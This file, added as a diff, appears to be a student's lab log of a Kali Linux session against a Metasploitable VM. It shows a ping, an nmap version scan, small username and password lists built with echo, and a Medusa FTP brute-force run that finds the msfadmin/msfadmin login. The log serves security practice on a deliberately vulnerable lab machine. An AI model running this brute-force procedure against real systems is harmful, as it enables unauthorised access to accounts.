@@ -1,0 +1,64 @@
+# Teste Metasploitable /kali linux brute for Medusa ftp
+
+RESULTADOS
+
+┌──(kali㉿kali)-[~]
+└─$ ping -c 3 192.168.56.102  # IP da VM Metasploitable
+PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
+64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=1.25 ms
+64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=0.940 ms
+64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=1.04 ms
+
+- -- 192.168.56.102 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2005ms
+rtt min/avg/max/mdev = 0.940/1.077/1.254/0.131 ms
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -p 21,22,80,445,139  192.168.56.102
+Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-10-21 18:59 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.102
+Host is up (0.0016s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:22:C3:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
+
+┌──(kali㉿kali)-[~]
+└─$
+
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+Medusa v2.3 [[http://www.foofus.net](http://www.foofus.net/)] (C) JoMo-Kun / Foofus Networks [jmk@foofus.net](mailto:jmk@foofus.net)
+
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (1 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: 123456 (4 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (1 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (2 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
+2025-10-21 19:00:31 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+2025-10-21 19:00:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
+2025-10-21 19:00:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2025-10-21 19:00:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
+2025-10-21 19:00:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
+2025-10-21 19:00:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+2025-10-21 19:00:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
+2025-10-21 19:00:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (2 of 4 complete)
+2025-10-21 19:00:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (3 of 4 complete)
+2025-10-21 19:00:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (4 of 4 complete)
+
+┌──(kali㉿kali)-[~]
+└─$
